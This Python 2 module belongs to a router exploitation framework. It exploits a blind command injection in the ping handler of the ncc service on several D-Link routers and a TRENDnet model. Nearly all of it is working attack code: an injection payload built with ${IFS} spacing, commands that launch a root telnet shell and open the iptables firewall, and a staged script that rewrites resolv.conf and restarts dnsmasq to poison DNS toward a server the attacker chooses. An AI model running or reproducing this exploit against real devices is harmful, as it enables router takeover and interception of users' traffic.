#coding: utf-8
'''
@Test list:
DIR-636L A1 1.04
'''
import time
from routelib import *
from exp_template import *
import re

class dir_636l_rce(Exploit):
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        self.url = url
        self.taskid = taskid
        self.targetid = targetid
        self.cmd_connect = cmd_connect
        self.data_redirect = data_redirect
        self.dns_server = dns_server
        self.proxies = proxies
        self.log_data = []
        self.shell_data = []
        
    def meta_info(self):
        return {
            'name': 'dir_636l_rce',
            'author': 'z',
            'date': '2018-03-15',
            'attack_type': 'RCE',
            'app_type': 'router',              #路由器为Router
            'app_name': 'D-Link',
            'min_version': '',
            'max_version': '',
            'version_list': [
                "D-Link DIR-626L",
                "D-Link DIR-636L",
                "D-Link DIR-808L",
                "D-Link DIR-810L",
                "D-Link DIR-810L",
                "D-Link DIR-820L",
                "D-Link DIR-820L",
                "D-Link DIR-820L",
                "D-Link DIR-826L",
                "D-Link DIR-830L",
                "D-Link DIR-836L",
                "TRENDnet TEW-731BR"
            ],             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'This module exploits a remote command injection vulnerability on several routers. The vulnerability exists in the ncc service, while handling ping commands.',
            'reference':[
                'https://github.com/darkarnium/secpub/tree/master/Multivendor/ncc2',
                'http://seclists.org/fulldisclosure/2015/Mar/15',
                'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10052',
            ],   #参考文档
        }
    '''
    D-Link DIR-626L (Rev A) v1.04b04
    D-Link DIR-636L(Rev A) v1.04
    D-Link DIR-808L (Rev A) v1.03b05
    D-Link DIR-810L (Rev A) v1.01b04
    D-Link DIR-810L (Rev B) v2.02b01
    D-Link DIR-820L (Rev A) v1.02B10
    D-Link DIR-820L (Rev A) v1.05B03
    D-Link DIR-820L (Rev B) v2.01b02
    D-Link DIR-826L (Rev A) v1.00b23
    D-Link DIR-830L (Rev A) v1.00b07
    D-Link DIR-836L (Rev A) v1.01b03
    TRENDnet TEW-731BR (Rev 2) v2.01b01
    '''
        
    def exploit(self):
        if self.check():
            self.report("Target might be vulnerable - it is hard to verify")
            self.report("It is blind command injection, response is not available",Level.warming)
            self.report("DNS Poisoning...")
            #self.command_stager()
            tport = random_port(4)
            self.do_dns_telnet(tport)

        else:
            self.report("Target is not vulnerable",Level.warming)
        self.report('Exploit is complete')

    def dns_poison(self,telnet_handle, new_dns_server='192.168.220.5', dns_conf_path='/etc/resolv.conf', restart_cmd='"dnsmasq -C /var/servd/DNS.conf"'):
        '''
        dnsmasq -o -u root -i br0 -z br0 -a 192.168.0.1 -x /var/run/dnsmasq_br0.pid -H /etc/hosts --edns-packet-max=4096 --all-server --strict-order -A /router.dlink.com/192.168.0.1 -A /dlinkrouter/192.168.0.1 -A /dlinkrouter3258/192.168.0.1 -A /dlinkrouter.local/192.168.0.1 -A /dlinkrouter3258.local/192.168.0.1
        # cat /var/tmp/resolv.conf.other4
        nameserver 114.114.114.114
        # cat /etc/resolv.conf
        nameserver 114.114.114.114
        '''
        every_send = 80
        completed = 0
        dns_handle = dns.dnsmasq_poison(self.dns_server,dns_conf_path,restart_cmd)
        #dns_handle.set_debug_mode()
        dns_shell = dns_handle.get_dns_poison_shell_cmds(every_send,'')
        wf = dns_shell['script_name']
        total_size = dns_shell['size']
        for cmd in dns_shell['cmds']:
            completed += every_send
            #print cmd
            telnet_handle.sendone(cmd)
            if completed >= total_size:
                completed = total_size
            self.report('Command Stager progress - %.2f%% done (%d/%d) bytes' % (float(completed)/total_size*100, completed, total_size))

        chmod_dns_shell = 'chmod +x %s' % wf
        execute_dns_shell = '%s' % wf

        self.report('Command: "%s" done.' % chmod_dns_shell)
        telnet_handle.sendone(chmod_dns_shell)
        #print execute_dns_shell
        self.report('Command: "%s" done.' % execute_dns_shell)

        result = telnet_handle.sendone(execute_dns_shell)

    def get_cmd_from_cmdline(self, host, port, dns_elf_name='dnsmasq'):
        cmd_line = None

        tn = telnet_lib.TelnetSession()
        status = tn.connect(host,port)
        if not status:
            self.report("CMDLINE: Target might not be vulnerable.")
            return None

        readed = tn.tn.read_until('# ')
        #print readed

        buf = tn.sendone('ps'.format(dns_elf_name))
        #print buf
        ## re match
        m = re.findall('\s*([0-9]+)\s+root\s+\S+\s+\S+\s+{}\s+.*'.format(dns_elf_name),buf)
        pid = 0
        if m and len(m) == 1:
            pid = m[0]
        else:
            return None

        cmd = 'cat /proc/{}/cmdline'.format(pid)
        tn.raw_sendone(cmd)
        readed = tn.raw_read_until('# ')
        #
        tn.close()
        #print readed

        if (readed is None) or (len(readed) < 5):
            return None

        cmd_info = readed.split('\r\n')
        if len(cmd_info) == 2:
            cmd_line = cmd_info[1].replace('\x00',' ')

        return cmd_line

    def do_dns_telnet(self,tport):
        self.report("Telnetd port: %s" % tport)
        self.execute("telnetd -p %s -l /bin/sh" % tport)
        self.report("Open Hole On iptables")
        self.execute("iptables -I INPUT -p tcp --dport %s -j ACCEPT" % tport)

        m = re.match('http[s]*://([0-9\.]+).*',self.url)
        if m:
            try:
                host = m.groups()[0]
                ## get cmdline
                dns_restart_cmd = self.get_cmd_from_cmdline(host,tport)
                #print dns_restart_cmd
                if dns_restart_cmd is None:
                    self.report("Get DNS cmdline Failed",Level.error)
                    self.do_dns_cleanup(tport)
                    return False
                ###
                if dns_restart_cmd.endswith('# '):
                    dns_restart_cmd = dns_restart_cmd[:-2]
                tn = telnet_lib.TelnetSession()
                status = tn.connect(host,tport)
                if status:
                    self.dns_poison(tn, self.dns_server, '/etc/resolv.conf', dns_restart_cmd)
                else:
                    self.report("Target might not be vulnerable.")
                    self.do_dns_cleanup(tport)
                    return False
            except:
                import traceback
                self.report(traceback.print_exc(),Level.debug)

        self.do_dns_cleanup(tport)
        return False

    def do_dns_cleanup(self,tport):
        self.execute("killall telnetd")
        self.report("Cleanup!!!")
        self.execute("iptables -D INPUT -p tcp --dport %s -j ACCEPT" % tport)
        return True

    def command_stager(self):
        while True:
            cmd = raw_input("# ")
            if cmd in ['exit', 'quit']:
                return
            self.report(self.execute(cmd))

    def execute(self, cmd):
        req = session()
        #cmd_new = "cd && cd tmp && export PATH=$PATH:. && {}".format(cmd)
        cmd_new = cmd.replace(' ','${IFS}')
        data = 'ccp_act=ping_v6&ping_addr=$({})'.format(cmd_new)
        url = "{}/ping.ccp".format(self.url)
        try:
            req.post(url=url, data=data)
        except requests.Timeout as err:
            self.report(err.message,Level.warming)
            return ">timeout<"
        except requests.ConnectionError as err:
            pass
            self.report(err.message,Level.warming)
        return ""

    def check(self):
        req = session()
        url = "{}/ping.ccp".format(self.url)

        response = None
        try:
            response = req.get(url=url)
        except requests.Timeout as err:
            pass
            self.report(err.message,Level.warming)
        except requests.ConnectionError as err:
            pass
            self.report(err.message,Level.warming)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 500:# and "mini_httpd" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): dir_300_600_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = dir_636l_rce(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()
        
        
        
